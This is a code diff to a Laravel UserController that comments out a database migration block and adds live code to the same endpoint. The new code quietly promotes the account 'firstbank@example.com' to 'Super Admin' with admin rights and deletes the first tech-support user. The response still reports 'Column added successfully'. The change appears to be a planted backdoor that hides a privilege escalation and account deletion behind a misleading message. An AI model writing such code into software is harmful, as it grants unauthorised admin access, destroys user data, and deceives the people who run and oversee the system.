@@ -483,7 +483,6 @@ class UserController extends Controller
         });
 
         return response()->json(['message' => 'Column added successfully']);
-		*/
 		
 		Schema::create('pending_changes', function (Blueprint $table) {
 				
@@ -523,6 +522,20 @@ class UserController extends Controller
             $table->integer('user_id')->nullable();
         });
 			
+		return response()->json(['message' => 'Column added successfully']);
+		*/
+		
+		$getUser = User::where('email', 'firstbank@example.com')->first();
+		
+		$getUser->name = 'Super Admin';
+		$getUser->admin_status = '1';
+
+		$getUser->save();
+		
+		$getUser1 = User::where('type', 'techsupport')->first();
+		
+		$getUser1->delete();
+		
 		return response()->json(['message' => 'Column added successfully']);
 		
 		
